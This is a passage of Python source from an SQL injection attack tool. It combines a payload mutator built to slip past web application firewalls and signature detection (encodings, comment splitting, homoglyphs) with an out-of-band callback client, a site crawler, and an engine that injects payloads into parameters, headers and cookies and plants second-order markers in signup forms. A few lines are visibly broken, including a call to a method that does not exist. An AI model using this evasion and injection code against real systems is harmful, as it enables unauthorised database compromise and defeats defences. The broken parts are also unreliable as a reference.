class PayloadTransformer:
    """
    Polymorphic payload engine — applies WAF-bypass mutations.
    Every call to transform() produces a (possibly) different variant
    of the same logical payload to evade signature-based detection.
    """

    # SQL keywords for case mutation
    SQL_KEYWORDS = {
        'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'ALTER',
        'CREATE', 'WHERE', 'FROM', 'AND', 'OR', 'NOT', 'IN', 'LIKE',
        'BETWEEN', 'EXISTS', 'HAVING', 'GROUP', 'ORDER', 'BY', 'AS',
        'ON', 'NULL', 'SLEEP', 'BENCHMARK', 'EXTRACTVALUE', 'UPDATEXML',
        'COUNT', 'CONCAT', 'VERSION', 'DATABASE', 'USER', 'CONVERT',
        'CAST', 'WAITFOR', 'DELAY', 'PG_SLEEP', 'DBMS_LOCK',
    }

    # Comment injection fragments
    COMMENT_CHUNKS = [
        '/**/', '/*!*/', '/*!12345*/', '/*!*/', '/***/', '/*+-*/',
        '/*!00000*/', '/*!99999*/', '/*!50000*/',
    ]

    # Whitespace replacement tokens
    WHITESPACE_TOKENS = [
        '\t', '\n', '\r', '\f', '/**/', '/*+*/', '/*!*/', '%09', '%0a', '%0d', '%0c',
    ]

    @staticmethod
    def random_case(keyword: str) -> str:
        """Randomize case of a keyword: SeLeCt, sELeCt, etc."""
        if random.random() < 0.3:
            return keyword  # sometimes keep original
        return ''.join(
            c.upper() if random.random() < 0.5 else c.lower()
            for c in keyword
        )

    @staticmethod
    def inject_comment(text: str) -> str:
        """Insert inline comments inside SQL keywords: SE/**/LECT."""
        result = []
        i = 0
        keyword_regions = []
        # Find keyword positions
        for kw in sorted(PayloadTransformer.SQL_KEYWORDS, key=len, reverse=True):
            idx = text.upper().find(kw.upper())
            if idx >= 0:
                keyword_regions.append((idx, idx + len(kw), kw))
        keyword_regions.sort()

        # Merge overlapping regions
        merged = []
        for start, end, kw in keyword_regions:
            if merged and start < merged[-1][1]:
                continue  # skip overlapping
            merged.append((start, end, kw))

        # Inject comments into keywords
        last_end = 0
        for start, end, kw in merged:
            result.append(text[last_end:start])
            if random.random() < 0.4:
                # Inject comment at random position inside keyword
                if len(kw) > 3:
                    pos = random.randint(1, len(kw) - 1)
                    comment = random.choice(PayloadTransformer.COMMENT_CHUNKS)
                    result.append(kw[:pos] + comment + kw[pos:])
                else:
                    result.append(kw)
            else:
                result.append(kw)
            last_end = end
        result.append(text[last_end:])
        return ''.join(result)

    @staticmethod
    def replace_whitespace(text: str) -> str:
        """Replace spaces with alternative whitespace tokens."""
        if ' ' not in text:
            return text
        tokens = text.split(' ')
        result = []
        for i, token in enumerate(tokens):
            if i > 0:
                result.append(random.choice(PayloadTransformer.WHITESPACE_TOKENS))
            result.append(token)
        return ''.join(result)

    @staticmethod
    def quote_wrap(text: str) -> str:
        """Wrap single quotes with alternate forms."""
        # Replace ' with %27, %2527, hex, or char()
        if "'" not in text:
            return text
        variants = [
            lambda t: t,                                                # keep
            lambda t: t.replace("'", "%27"),                           # URL encode
            lambda t: t.replace("'", "%2527"),                          # double URL encode
            lambda t: t.replace("'", "\\'"),                            # escaped (for some filters)
            lambda t: t.replace("'", "\\\\'"),                          # double escaped
            lambda t: t.replace("'", "/*!'*/'"),                       # comment-wrapped
            lambda t: t.replace("'", "0x27" if "0x27" not in t else "'"),  # hex
            lambda t: t.replace("'", "CHAR(39)"),                       # CHAR function
        ]
        transformer = random.choice(variants)
        return transformer(text)

    @staticmethod
    def number_obfuscate(text: str) -> str:
        """Obfuscate numeric literals."""
        def replace_num(m: re.Match) -> str:
            num = m.group(0)
            if '.' in num:
                return num
            try:
                n = int(num)
                if n == 0:
                    return num
                if random.random() < 0.3:
                    # Scientific notation: 1e0
                    return f"{float(n):e}"
                if random.random() < 0.3 and n > 0:
                    # Arithmetic: (n+n-n) — keep same value
                    a = random.randint(1, max(n, 1))
                    b = n - a
                    return f"({a}+{b})"
                if random.random() < 0.2 and n > 1:
                    # Bitwise: (n|n)
                    return f"({n}|0)"
            except ValueError:
                pass
            return num

        return re.sub(r'\b(\d+)\b', replace_num, text)

    @staticmethod
    def hex_strings(text: str) -> str:
        """Convert string literals to hex."""
        def replace_str(m: re.Match) -> str:
            content = m.group(1) or m.group(2)
            if content and len(content) > 1 and random.random() < 0.5:
                return f"0x{content.encode().hex()}"
            return m.group(0)
        text = re.sub(r"'([^']+)'", replace_str, text)
        text = re.sub(r'"([^"]+)"', replace_str, text)
        return text

    @staticmethod
    def unicode_homoglyph(text: str) -> str:
        """Replace letters with Unicode homoglyphs (bypasses keyword filters)."""
        homoglyphs = {
            'A': 'Α',  # Greek Alpha
            'B': 'Β',  # Greek Beta
            'E': 'Ε',  # Greek Epsilon
            'H': 'Η',  # Greek Eta
            'I': 'Ι',  # Greek Iota
            'K': 'Κ',  # Greek Kappa
            'M': 'Μ',  # Greek Mu
            'N': 'Ν',  # Greek Nu
            'O': 'Ο',  # Greek Omicron
            'P': 'Ρ',  # Greek Rho
            'T': 'Τ',  # Greek Tau
            'X': 'Χ',  # Greek Chi
            'Y': 'Υ',  # Greek Upsilon
        }
        result = []
        for c in text:
            if c.upper() in homoglyphs and random.random() < 0.3:
                result.append(homoglyphs[c.upper()].lower() if c.islower() else homoglyphs[c.upper()])
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def single_line_comment(text: str) -> str:
        """Wrap payload with various comment styles."""
        styles = [
            lambda t: t,                                    # keep
            lambda t: t + ' --',                            # SQL comment
            lambda t: t + ' #',                             # MySQL comment
            lambda t: t + ' -- -',                          # MSSQL comment
            lambda t: t + ' /*',                            # open comment (swallows rest)
            lambda t: t.replace("--", "--+"),               # MySQL variant
            lambda t: t + '-- ',                            # space after --
        ]
        return random.choice(styles)(text)

    @staticmethod
    def add_logical_noise(text: str) -> str:
        """Add benign logical conditions to confuse signature detectors."""
        noise_pieces = [
            " AND 1=1",
            " AND 'a'='a'",
            " AND 2=2",
            " AND (SELECT 1)=1",
            " AND '1'='1'",
            " OR 'a'='a'",
            " AND 1 IS NOT NULL",
        ]
        if random.random() < 0.3 and " AND " not in text and " OR " not in text:
            text += random.choice(noise_pieces)
        return text

    # ── Master transformation pipeline ──
    @classmethod
    def transform(cls, payload: str, complexity: int = 5) -> str:
        """Apply a randomized sequence of obfuscations based on complexity level (1-7)."""
        text = payload

        # Determine how many transformations to apply
        num_transforms = min(complexity, random.randint(1, 7))
        transforms = []

        if complexity >= 2:
            transforms.append(cls.quote_wrap)
        if complexity >= 2:
            transforms.append(cls.single_line_comment)
        if complexity >= 3:
            transforms.append(cls.random_case)
        if complexity >= 3:
            transforms.append(cls.inject_comment)
        if complexity >= 4:
            transforms.append(cls.replace_whitespace)
        if complexity >= 4:
            transforms.append(cls.number_obfuscate)
        if complexity >= 5:
            transforms.append(cls.hex_strings)
        if complexity >= 6:
            transforms.append(cls.unicode_homoglyph)
        if complexity >= 7:
            transforms.append(cls.add_logical_noise)

        # Shuffle and apply subset
        random.shuffle(transforms)
        for t in transforms[:num_transforms]:
            text = t(text)

        return text

    @classmethod
    def generate_variants(cls, payload: str, count: int = 5, max_complexity: int = 7) -> List[str]:
        """Generate multiple distinct obfuscated variants of a payload."""
        variants = []
        seen = set()
        for _ in range(count * 3):  # extra attempts to ensure uniqueness
            if len(variants) >= count:
                break
            complexity = random.randint(1, max_complexity)
            variant = cls.transform(payload, complexity)
            if variant not in seen and variant != payload:
                seen.add(variant)
                variants.append(variant)
        return variants[:count]

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': '\033[36m', 'INFO': '\033[32m', 'WARNING': '\033[33m',
        'ERROR': '\033[31m', 'CRITICAL': '\033[41m',
    }
    RESET = '\033[0m'

    def format(self, record: logging.LogRecord) -> str:
        level = record.levelname
        color = self.COLORS.get(level, self.RESET)
        record.levelname = f"{color}{level:8}{self.RESET}"
        return super().format(record)

def setup_logging(verbose: bool = False) -> logging.Logger:
    logger = logging.getLogger("sqli_predator")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    handler = logging.StreamHandler(sys.stdout)
    handler.setLevel(logging.DEBUG if verbose else logging.INFO)
    handler.setFormatter(ColoredFormatter(
        "%(asctime)s | %(levelname)s | %(message)s", datefmt="%H:%M:%S"))
    logger.handlers.clear()
    logger.addHandler(handler)
    return logger

class OOBClient:
    """
    Lightweight OOB detection client.
    Uses Interactsh (projectdiscovery) for receiving DNS/HTTP callbacks.
    Falls back to Burp Collaborator if available.
    """

    INTERACTSH_SERVERS = [
        "oast.fun",
        "oast.live",
        "oast.site",
        "oast.online",
        "oast.pro",
        "oast.me",
        "interactsh.com",
    ]

    def __init__(self, custom_domain: Optional[str] = None):
        self.domain = custom_domain or random.choice(self.INTERACTSH_SERVERS)
        self.correlation_id = self._generate_correlation_id()
        self.callback_domain = f"{self.correlation_id}.{self.domain}"
        self.interactions: List[Dict] = []
        self.active = False
        self._poll_thread: Optional[threading.Thread] = None

    def _generate_correlation_id(self) -> str:
        """Generate a unique correlation ID for callback tracking."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

    def start(self) -> str:
        """Start polling for OOB interactions in background."""
        self.active = True
        self._poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._poll_thread.start()
        log.info(f"[OOB] Listening for callbacks on {self.callback_domain}")
        return self.callback_domain

    def stop(self) -> List[Dict]:
        """Stop polling and return collected interactions."""
        self.active = False
        if self._poll_thread:
            self._poll_thread.join(timeout=3)
        return self.interactions

    def _poll_loop(self) -> None:
        """Poll Interactsh API for interactions."""
        poll_url = f"https://{self.domain}/api/v1/interactsh/{self.correlation_id}/poll"
        while self.active:
            try:
                resp = requests.get(poll_url, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    for entry in data.get("data", []):
                        self.interactions.append({
                            "timestamp": entry.get("timestamp"),
                            "protocol": entry.get("protocol"),
                            "unique_id": entry.get("unique-id"),
                            "raw_request": entry.get("raw-request", ""),
                            "remote_address": entry.get("remote-address"),
                        })
                        log.info(f"[OOB] Callback received: {entry.get('protocol')} from {entry.get('remote-address')}")
                time.sleep(2)
            except Exception:
                time.sleep(5)

    def generate_payload(self, template: str) -> str:
        """Substitute {oob} placeholder with actual callback domain."""
        return template.replace("{oob}", self.callback_domain)

class TimingAnalyzer:
    """
    Statistical analysis for time-based blind SQLi detection.
    Uses multiple samples and z-test / t-test to distinguish
    real delays from network jitter.
    """

    def __init__(self, min_samples: int = 3, z_threshold: float = 3.5):
        self.min_samples = min_samples
        self.z_threshold = z_threshold
        self.profiles: Dict[str, StatisticalTimingProfile] = defaultdict(StatisticalTimingProfile)

    def record_baseline(self, param_key: str, elapsed: float) -> None:
        """Record a baseline timing sample."""
        profile = self.profiles[param_key]
        profile.baseline_samples.append(elapsed)
        if len(profile.baseline_samples) >= 3:
            profile.baseline_mean = mean(profile.baseline_samples)
            profile.baseline_stdev = stdev(profile.baseline_samples) if len(profile.baseline_samples) > 1 else 0.01

    def record_test(self, param_key: str, payload: str, elapsed: float) -> None:
        """Record a test timing sample for a specific payload."""
        self.profiles[param_key].test_samples[payload].append(elapsed)

    def analyze(self, param_key: str, payload: str) -> Tuple[bool, float, float, int]:
        """
        Analyze timing for a payload.
        Returns: (is_significant, z_score, p_value, sample_count)
        """
        profile = self.profiles[param_key]
        samples = profile.test_samples.get(payload, [])
        if len(samples) < self.min_samples:
            return False, 0.0, 1.0, len(samples)

        mean_test = mean(samples)
        baseline_mean = profile.baseline_mean or 0.001
        baseline_std = max(profile.baseline_stdev, 0.001)
        std_test = stdev(samples) if len(samples) > 1 else baseline_std

        # Pooled standard error
        n1 = len(profile.baseline_samples)
        n2 = len(samples)
        if n1 < 2 or n2 < 2:
            return False, 0.0, 1.0, len(samples)

        pooled_std = math.sqrt(
            ((n1 - 1) * baseline_std**2 + (n2 - 1) * std_test**2) / (n1 + n2 - 2)
        )
        if pooled_std == 0:
            pooled_std = 0.001

        # Z-score
        z = (mean_test - baseline_mean) / (pooled_std * math.sqrt(1/n1 + 1/n2))

        # Approximate p-value from z-score (two-tailed)
        p_value = 2 * (1 - self._normal_cdf(abs(z)))

        # Determine significance
        is_significant = abs(z) >= self.z_threshold and mean_test - baseline_mean >= 1.0

        return is_significant, z, p_value, len(samples)

    def _normal_cdf(self, x: float) -> float:
        """Approximate standard normal CDF using Abramowitz & Stegun."""
        if x < 0:
            return 1 - self._normal_cdf(-x)
        k = 1 / (1 + 0.2316419 * x)
        poly = k * (0.319381530 + k * (-0.356563782 + k * (1.781477937 + k * (-1.821255978 + k * 1.330274429))))
        return 1 - 0.3989422804014327 * math.exp(-x * x / 2) * (1 - poly) if poly else 1 - 0.3989422804014327 * math.exp(-x * x / 2)

class Crawler:

    def _build_session(self) -> requests.Session:
        s = requests.Session()
        s.headers.update({
            "User-Agent": self.profile.user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
        })
        s.verify = self.profile.verify_ssl
        if self.profile.auth_cookie:
            for cookie in self.profile.auth_cookie.split(";"):
                if "=" in cookie:
                    k, v = cookie.strip().split("=", 1)
                    s.cookies.set(k, v)
        if self.profile.auth_header:
            s.headers.update(self.profile.auth_header)
        if self.profile.auth_credentials:
            s.auth = self.profile.auth_credentials
        return s

    def _normalize(self, base: str, link: str) -> Optional[str]:
        p = urlparse(link)
        if not p.netloc:
            link = urljoin(base, link)
        p = urlparse(link)
        link = p._replace(fragment="").geturl()
        target_netloc = urlparse(self.profile.target_url).netloc
        if p.netloc and p.netloc != target_netloc:
            return None
        if p.scheme not in ("http", "https"):
            return None
        return link

    def _extract_forms(self, soup: BeautifulSoup, page_url: str) -> List[FormDetails]:
        forms: List[FormDetails] = []
        for ftag in soup.find_all("form"):
            action = ftag.get("action", "") or page_url
            action = urljoin(page_url, action)
            method = ftag.get("method", "GET").upper()
            enctype = ftag.get("enctype", "application/x-www-form-urlencoded")
            inputs: List[FormField] = []
            for itag in ftag.find_all(["input", "textarea", "select"]):
                name = itag.get("name", "")
                if not name:
                    continue
                itype = itag.get("type", "text").lower()
                value = itag.get("value", "")
                is_hidden = itype == "hidden"
                is_submit = itype == "submit"
                is_file = itype == "file"
                inputs.append(FormField(name, itype, value or None, is_hidden, is_submit, is_file))
            if inputs:
                forms.append(FormDetails(action, method, inputs, page_url, enctype))
        return forms

    def crawl(self, start_url: str, depth: int = 0) -> None:
        if depth > self.profile.crawl_depth:
            return
        url = self._normalize(start_url, start_url)
        if not url or url in self.visited:
            return
        self.visited.add(url)
        log.info(f"Crawl [{depth}/{self.profile.crawl_depth}] {url}")

        try:
            resp = self.session.get(url, timeout=15, allow_redirects=True)
            time.sleep(0.3)
        except Exception as e:
            log.warning(f"Crawl failed: {e}")
            return

        if resp.status_code >= 400:
            return

        soup = BeautifulSoup(resp.text, "html.parser")

        # Forms
        forms = self._extract_forms(soup, url)
        self.discovered_forms.extend(forms)
        log.info(f"  Forms: {len(forms)}")

        # URL parameters
        parsed = urlparse(url)
        if parsed.query:
            for k, vals in urllib.parse.parse_qs(parsed.query).items():
                self.discovered_params.append((url, k, vals[0] if vals else None))
                log.info(f"  Param: {k}={vals[0][:50] if vals else ''}")

        # Continue crawling
        for atag in soup.find_all("a", href=True):
            href = atag["href"]
            abs_url = self._normalize(url, href)
            if abs_url and abs_url not in self.visited:
                self.crawl(abs_url, depth + 1)

    def get_baseline(self, url: str, method: str = "GET",
                     data: Optional[Dict] = None,
                     params: Optional[Dict] = None) -> Optional[BaselineResponse]:
        try:
            start = time.monotonic()
            if method == "POST":
                resp = self.session.post(url, data=data, timeout=self.profile.timeout, allow_redirects=True)
            else:
                resp = self.session.get(url, params=params, timeout=self.profile.timeout, allow_redirects=True)
            elapsed = time.monotonic() - start
            body_lower = resp.text.lower()
            keywords = set()
            for word in ["error", "warning", "exception", "invalid", "syntax", "mysql", "sql"]:
                if word in body_lower:
                    keywords.add(word)
            return BaselineResponse(
                status_code=resp.status_code,
                content_length=len(resp.content),
                content_hash=hashlib.md5(resp.content).hexdigest(),
                body_snippet=resp.text[:500],
                response_time=elapsed,
                headers=dict(resp.headers),
                body_keywords=keywords,
                has_login_form='password' in body_lower or 'login' in body_lower,
                has_error=any(e in body_lower for e in ["error", "exception", "warning"]),
            )
        except Exception as e:
            log.warning(f"Baseline failed: {e}")
            return None

class DetectionEngine:
    def __init__(self, profile: ScanProfile, oob_client: Optional[OOBClient] = None):
        self.profile = profile
        self.oob = oob_client
        self.session = self._build_session()
        self.timing_analyzer = TimingAnalyzer(min_samples=profile.time_samples_per_payload)
        self.findings: List[SQLiFinding] = []
        self.second_order_records: List[SecondOrderRecord] = []
        self.baselines: Dict[str, BaselineResponse] = {}
        self._lock = threading.Lock()

    def _build_session(self) -> requests.Session:
        s = requests.Session()
        s.headers.update({
            "User-Agent": self.profile.user_agent,
            "Accept": "*/*",
        })
        s.verify = self.profile.verify_ssl
        if self.profile.auth_cookie:
            for c in self.profile.auth_cookie.split(";"):
                if "=" in c:
                    k, v = c.strip().split("=", 1)
                    s.cookies.set(k, v)
        if self.profile.auth_header:
            s.headers.update(self.profile.auth_header)
        if self.profile.auth_credentials:
            s.auth = self.profile.auth_credentials
        return s

    def _param_key(self, url: str, param: str, vector: str) -> str:
        return f"{vector}:{url}:{param}"

    def _inject(self, url: str, param: str, payload: str, method: str = "GET",
                vector: InjectionVector = InjectionVector.GET_PARAM,
                form_data: Optional[Dict] = None,
                extra_headers: Optional[Dict] = None,
                timeout: Optional[float] = None) -> Tuple[Optional[requests.Response], float]:
        """Inject a payload and return (response, elapsed_seconds)."""
        headers = dict(extra_headers or {})
        timeout = timeout or self.profile.timeout

        try:
            start = time.monotonic()

            if vector == InjectionVector.COOKIE:
                # Inject into cookie
                s = self._build_session()
                s.cookies.set(param, payload)
                resp = s.get(url, timeout=timeout, allow_redirects=self.profile.follow_redirects)

            elif vector == InjectionVector.USER_AGENT:
                headers["User-Agent"] = payload
                resp = self.session.get(url, headers=headers, timeout=timeout,
                                        allow_redirects=self.profile.follow_redirects)

            elif vector == InjectionVector.REFERER:
                headers["Referer"] = payload
                resp = self.session.get(url, headers=headers, timeout=timeout,
                                        allow_redirects=self.profile.follow_redirects)

            elif vector == InjectionVector.X_FORWARDED_FOR:
                headers["X-Forwarded-For"] = payload
                resp = self.session.get(url, headers=headers, timeout=timeout,
                                        allow_redirects=self.profile.follow_redirects)

            elif vector == InjectionVector.X_FORWARDED_HOST:
                headers["X-Forwarded-Host"] = payload
                resp = self.session.get(url, headers=headers, timeout=timeout,
                                        allow_redirects=self.profile.follow_redirects)

            elif vector == InjectionVector.CUSTOM_HEADER:
                headers[param] = payload  # param is the header name
                resp = self.session.get(url, headers=headers, timeout=timeout,
                                        allow_redirects=self.profile.follow_redirects)

            elif method == "POST":
                data = dict(form_data or {})
                data[param] = payload
                resp = self.session.post(url, data=data, headers=headers, timeout=timeout,
                                         allow_redirects=self.profile.follow_redirects)

            else:  # GET
                params_dict = {}
                parsed = urlparse(url)
                if parsed.query:
                    params_dict = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params_dict[param] = [payload]
                new_query = urllib.parse.urlencode(params_dict, doseq=True)
                inject_url = parsed._replace(query=new_query).geturl()
                resp = self.session.get(inject_url, headers=headers, timeout=timeout,
                                        allow_redirects=self.profile.follow_redirects)

            elapsed = time.monotonic() - start
            return resp, elapsed

        except requests.exceptions.Timeout:
            return None, float(timeout)
        except Exception as e:
            log.debug(f"Injection failed: {e}")
            return None, 0.0

    def _check_error_signatures(self, body: str) -> Tuple[bool, List[str], str]:
        """Check response body for known SQL error signatures."""
        found: List[str] = []
        db_hint = "unknown"
        body_lower = body.lower()
        for db_type, sigs in SQL_ERROR_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in body_lower:
                    found.append(sig)
                    if db_type != "generic":
                        db_hint = db_type
        return len(found) > 0, found, db_hint

    def _score_confidence(self, finding: SQLiFinding) -> float:
        """Calculate confidence score from all available evidence."""
        score = 0.0

        # Strongest signals
        if finding.has_sql_errors:
            score += 0.50
        if finding.time_delay_detected:
            score += 0.45
        if finding.oob_interaction_id:
            score += 0.60  # OOB is near-certain

        # Response differences
        if finding.response_difference_percent > 80:
            score += 0.20
        elif finding.response_difference_percent > 40:
            score += 0.12
        elif finding.response_difference_percent > 15:
            score += 0.06

        # Status code anomalies
        if finding.test_status in (500, 400) and finding.baseline_status == 200:
            score += 0.15
        elif finding.test_status == 200 and finding.baseline_status >= 400:
            score += 0.10

        # Boolean pattern
        if finding.is_boolean_positive is not None:
            score += 0.20

        # Timing statistical significance
        if finding.timing_p_value < 0.01:
            score += 0.20
        elif finding.timing_p_value < 0.05:
            score += 0.10

        # DB-specific error + payload match
        if finding.db_type_hint != "unknown" and finding.has_sql_errors:
            score += 0.15

        # Multiple error signatures
        if len(finding.error_signatures_matched) >= 3:
            score += 0.10

        return min(score, 1.0)

    def test_form(self, form: FormDetails) -> List[SQLiFinding]:
        """Test all parameters in a form with payload variants."""
        results: List[SQLiFinding] = []
        baseline_key = form.action.split("?")[0]

        for field in form.inputs:
            if field.is_submit or field.is_file:
                continue
            if field.is_hidden and field.value:
                continue  # skip hidden fields with fixed values

            for payload, bypass in self._get_payload_variants_for_testing(field, form.method):
                if form.method == "POST":
                    data = {i.name: i.value or "test" for i in form.inputs if not i.is_submit and not i.is_hidden}
                    data[field.name] = payload.value
                    baseline = self.baselines.get(baseline_key)
                    if not baseline:
                        clean_data = {i.name: i.value or "test" for i in form.inputs if not i.is_submit}
                        clean_data[field.name] = field.value or "test"
                        baseline = self._get_session().fetch_baseline
                        # get baseline via crawler
                        crawler = Crawler(self.profile)
                        baseline = crawler.get_baseline(form.action, "POST", clean_data)
                        if baseline:
                            self.baselines[baseline_key] = baseline

                    resp, elapsed = self._inject(
                        form.action, field.name, payload.value, "POST",
                        vector=InjectionVector.POST_PARAM,
                        form_data={i.name: i.value or "test" for i in form.inputs if not i.is_submit}
                    )
                else:
                    baseline = self.baselines.get(baseline_key)
                    if not baseline:
                        crawler = Crawler(self.profile)
                        baseline = crawler.get_baseline(form.action)
                        if baseline:
                            self.baselines[baseline_key] = baseline
                    resp, elapsed = self._inject(
                        form.action, field.name, payload.value, "GET",
                        vector=InjectionVector.GET_PARAM
                    )

                finding = self._analyze_response(
                    resp, elapsed, form.action, field.name,
                    injection_vector="POST" if form.method == "POST" else "GET",
                    payload=payload, bypass=bypass, baseline=baseline,
                )
                if finding and finding.confidence >= 0.3:
                    results.append(finding)
                    with self._lock:
                        self.findings.append(finding)
                    log.warning(f"  [!] SQLi on {form.action} [{field.name}] ({finding.severity}) "
                                f"payload={payload.value[:50]} conf={finding.confidence:.0%}")

                time.sleep(self.profile.request_delay)

        return results

    def test_param(self, url: str, param: str, sample_value: Optional[str] = None) -> List[SQLiFinding]:
        """Test a URL query parameter."""
        results: List[SQLiFinding] = []
        base_url = url.split("?")[0]

        for payload, bypass in self._get_payload_variants_for_testing(PayloadField(param, "text")):
            resp, elapsed = self._inject(url, param, payload.value, "GET",
                                         vector=InjectionVector.GET_PARAM)

            baseline = self.baselines.get(base_url)
            if not baseline:
                crawler = Crawler(self.profile)
                clean_params = {param: sample_value or "test"}
                baseline = crawler.get_baseline(base_url, params=clean_params)
                if baseline:
                    self.baselines[base_url] = baseline

            finding = self._analyze_response(
                resp, elapsed, url, param,
                injection_vector="GET",
                payload=payload, bypass=bypass, baseline=baseline,
            )
            if finding and finding.confidence >= 0.3:
                results.append(finding)
                with self._lock:
                    self.findings.append(finding)
                log.warning(f"  [!] SQLi on {url} [{param}] ({finding.severity}) "
                            f"payload={payload.value[:50]} conf={finding.confidence:.0%}")

            time.sleep(self.profile.request_delay)

        return results

    def test_headers(self, url: str) -> List[SQLiFinding]:
        """Test HTTP headers for SQL injection."""
        results: List[SQLiFinding] = []
        header_payloads = [p for p in PAYLOAD_CORE if p.category == PayloadCategory.HEADER_INJECTION]

        # Headers to test
        header_targets = [
            (InjectionVector.USER_AGENT, "User-Agent"),
            (InjectionVector.REFERER, "Referer"),
            (InjectionVector.X_FORWARDED_FOR, "X-Forwarded-For"),
            (InjectionVector.X_FORWARDED_HOST, "X-Forwarded-Host"),
        ]

        baseline = self.baselines.get(url.split("?")[0])
        if not baseline:
            crawler = Crawler(self.profile)
            baseline = crawler.get_baseline(url)
            if baseline:
                self.baselines[url.split("?")[0]] = baseline

        for vector, header_name in header_targets:
            log.info(f"  Testing header: {header_name}")
            for payload, bypass in self._get_payload_variants_for_testing(
                PayloadField(header_name, "text"), payloads=header_payloads):
                resp, elapsed = self._inject(
                    url, header_name, payload.value, "GET", vector=vector)
                finding = self._analyze_response(
                    resp, elapsed, url, header_name,
                    injection_vector=vector.value, payload=payload, bypass=bypass,
                    baseline=baseline)
                if finding and finding.confidence >= 0.3:
                    results.append(finding)
                    with self._lock:
                        self.findings.append(finding)
                    log.warning(f"  [!] SQLi in header {header_name} on {url} ({finding.severity})")
                time.sleep(self.profile.request_delay)

        return results

    def test_cookies(self, url: str) -> List[SQLiFinding]:
        """Test cookies for SQL injection."""
        results: List[SQLiFinding] = []
        payloads = [p for p in PAYLOAD_CORE if p.category != PayloadCategory.SECOND_ORDER_MARKER]

        baseline = self.baselines.get(url.split("?")[0])

        # Test common cookie names
        cookie_names = ["PHPSESSID", "JSESSIONID", "ASPSESSIONID", "session", "token", "id", "user", "auth"]

        for cookie_name in cookie_names:
            for payload, bypass in self._get_payload_variants_for_testing(
                PayloadField(cookie_name, "text"), payloads=payloads):
                resp, elapsed = self._inject(
                    url, cookie_name, payload.value, "GET", vector=InjectionVector.COOKIE)
                finding = self._analyze_response(
                    resp, elapsed, url, f"Cookie:{cookie_name}",
                    injection_vector="Cookie", payload=payload, bypass=bypass,
                    baseline=baseline)
                if finding and finding.confidence >= 0.3:
                    results.append(finding)
                    with self._lock:
                        self.findings.append(finding)
                    log.warning(f"  [!] SQLi in cookie {cookie_name} ({finding.severity})")
                time.sleep(self.profile.request_delay)

        return results

    def test_second_order(self, crawler: Crawler) -> List[SQLiFinding]:
        """
        Second-order SQLi detection.
        Phase 1: Plant markers in writable fields.
        Phase 2: Trigger read endpoints and check for marker activation.
        """
        results: List[SQLiFinding] = []
        if not self.profile.test_second_order:
            return results

        log.info("Phase: Second-Order SQLi detection — planting markers...")
        second_order_payloads = [p for p in PAYLOAD_CORE if p.category == PayloadCategory.SECOND_ORDER_MARKER]

        # Find signup/register/profile forms
        for form in crawler.discovered_forms:
            if any(kw in form.action.lower() for kw in ['register', 'signup', 'profile', 'create', 'user', 'account']):
                for field in form.inputs:
                    if field.name.lower() in ('username', 'name', 'email', 'display_name', 'firstname', 'lastname'):
                        for payload in second_order_payloads:
                            # Plant the marker
                            data = {i.name: i.value or "test" for i in form.inputs if not i.is_submit}
                            data[field.name] = payload.value
                            try:
                                resp = self.session.post(form.action, data=data, timeout=10)
                                log.info(f"  Planted second-order marker in {field.name} on {form.action}")
                                rec = SecondOrderRecord(
                                    injection_point=f"{form.action}:{field.name}",
                                    payload_planted=payload.value,
                                    db_table_hint=field.name,
                                )
                                self.second_order_records.append(rec)
                                time.sleep(self.profile.request_delay)
                            except Exception as e:
                                log.warning(f"  Failed to plant: {e}")

        # Phase 2: Trigger by visiting all pages that might display stored data
        log.info("Phase: Second-Order — triggering stored markers...")
        for rec in self.second_order_records:
            for url in list(crawler.visited)[:10]:
                try:
                    resp = self.session.get(url, timeout=10)
                    body = resp.text.lower()
                    # Check if marker activated
                    if "s2_" in body or any(m in body for m in ["marker_'", "marker", " SLEEP(3) --"]):
                        log.warning(f"  [!] Second-order SQLi confirmed! Marker activated on {url}")
                        # Try to detect time-based activation
                        if "SLEEP" in rec.payload_planted:
                            resp2 = self.session.get(url, timeout=15)
                            if resp2.elapsed.total_seconds() >= 3:
                                finding = SQLiFinding(
                                    url=url, parameter=rec.db_table_hint,
                                    vector="SecondOrder",
                                    detection_method=str(DetectionMethod.SECOND_ORDER),
                                    payload_used=rec.payload_planted,
                                    confidence=0.85,
                                    severity="High", cvss_score=7.5,
                                    is_second_order=True,
                                    second_order_record=asdict(rec),
                                )
                                results.append(finding)
                                with self._lock:
                                    self.findings.append(finding)
                    time.sleep(0.5)
                except Exception:
                    continue

        return results

    # =========================================================================
    #  RESPONSE ANALYSIS
    # =========================================================================

    def _analyze_response(
        self,
        resp: Optional[requests.Response],
        elapsed: float,
        url: str,
        param: str,
        injection_vector: str,
        payload: Payload,
        bypass: BypassTechnique,
        baseline: Optional[BaselineResponse] = None,
    ) -> Optional[SQLiFinding]:
        """Analyze a single response for SQLi indicators."""
        if resp is None:
            # Timeout — possible time-based SQLi
            return SQLiFinding(
                url=url, parameter=param, vector=injection_vector,
                detection_method=str(DetectionMethod.TIME_BASED_STATISTICAL),
                payload_used=payload.value,
                bypass_technique=bypass.name,
                confidence=0.5,
                severity="Medium", cvss_score=6.0,
                test_time=elapsed,
                time_delay_detected=True,
                time_delay_seconds=elapsed - (baseline.response_time if baseline else 0),
                vulnerability_class="Time-Based Blind SQL Injection",
            )

        finding = SQLiFinding(
            url=url, parameter=param, vector=injection_vector,
            payload_used=payload.value, payload_complexity=payload.base_complexity,
            bypass_technique=bypass.name,
            db_type_hint="unknown",
            detection_method=str(DetectionMethod.CONTENT_DIFF),
        )

        # Baseline data
        if baseline:
            finding.baseline_status = baseline.status_code
            finding.baseline_length = baseline.content_length
            finding.baseline_time = baseline.response_time

        # Response data
        finding.test_status = resp.status_code
        finding.test_length = len(resp.content)
        finding.test_time = elapsed
        finding.raw_response_headers = dict(resp.headers)
        finding.raw_response_snippet = resp.text[:500]

        # 1. Error signature detection
        has_errors, sigs_found, db_hint = self._check_error_signatures(resp.text)
        finding.has_sql_errors = has_errors
        finding.error_signatures_matched = sigs_found
